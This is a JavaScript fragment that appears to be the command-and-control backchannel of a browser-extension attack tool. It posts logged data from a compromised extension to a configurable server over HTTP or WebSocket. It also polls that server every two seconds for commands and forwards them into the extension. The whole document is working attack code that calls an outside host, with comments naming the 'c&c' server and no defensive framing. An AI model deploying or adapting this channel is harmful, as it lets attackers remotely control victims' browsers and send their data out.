function(__p) {
        var url = '__URL__';
        if (url.match(/^http/)) { // http backchannel

            /* receive commands from ext and send the results to c&c */
            __p.onMessage.addListener(function(msg) {
                switch (msg.cmd) {
                    case 'log':
                        var x = new XMLHttpRequest();
                        x.open('POST', url + '?ch='+myHook, true);
                        x.send(JSON.stringify(msg.p));
                    break;
                }
            });
                
           /* poll for commands from c&c server and send them to ext */
            setInterval(function() {
                var x = new XMLHttpRequest();
                x.open('GET', url + '?ch='+myHook+'-cmd', true);
                x.onreadystatechange = function () {
                  if (x.readyState == 4 && x.status == 200) {
                    try {
                        var cmds = JSON.parse(x.responseText);
                        for (var i = 0; i < cmds.length; i++) {
                            // forward command to extension
                            __p.postMessage(cmds[i]);
                        }
                    } catch(e) {}
                  }
                };
                x.send(null);
            }, 2000);

        } else if (url.match(/^ws/)) { // WebSocket based backchannel
            function ReconnectingWebSocket(a,prot){function f(g){c=new WebSocket(a,prot);var h=c;var i=setTimeout(function(){e=true;h.close();e=false},b.timeoutInterval);c.onopen=function(c){clearTimeout(i);b.readyState=WebSocket.OPEN;g=false;b.onopen(c)};c.onclose=function(h){clearTimeout(i);c=null;if(d){b.readyState=WebSocket.CLOSED;b.onclose(h)}else{b.readyState=WebSocket.CONNECTING;if(!g&&!e){b.onclose(h)}setTimeout(function(){f(true)},b.reconnectInterval)}};c.onmessage=function(c){b.onmessage(c)};c.onerror=function(c){b.onerror(c)}}this.debug=false;this.reconnectInterval=1e3;this.timeoutInterval=2e3;var b=this;var c;var d=false;var e=false;this.url=a;this.prot=prot;this.readyState=WebSocket.CONNECTING;this.URL=a;this.onopen=function(a){};this.onclose=function(a){};this.onmessage=function(a){};this.onerror=function(a){};f(a);this.send=function(d){if(c){return c.send(d)}else{throw"INVALID_STATE_ERR : Pausing to reconnect websocket"}};this.close=function(){if(c){d=true;c.close()}};this.refresh=function(){if(c){c.close()}}};
        
            var ws = new ReconnectingWebSocket(url,'chef');

            /* receive commands from ext and send the results to c&c */
            __p.onMessage.addListener(function(msg) {
                switch (msg.cmd) {
                    case 'log':
                        ws.send(JSON.stringify({cmd:'post', p: msg.p}));
                    break;
                }
            });

            ws.onmessage = function(e) { // receive commands
                try {
                    var cmds = JSON.parse(e.data);
                    for (var i = 0; i < cmds.length; i++) {
                        // forward command to extension
                        __p.postMessage(cmds[i]);
                    }
                } catch(e) {}
            }
            ws.onopen = function() {
                ws.send(JSON.stringify({cmd:'hello-hook',ch: myHook}));
            };
        }
        
    }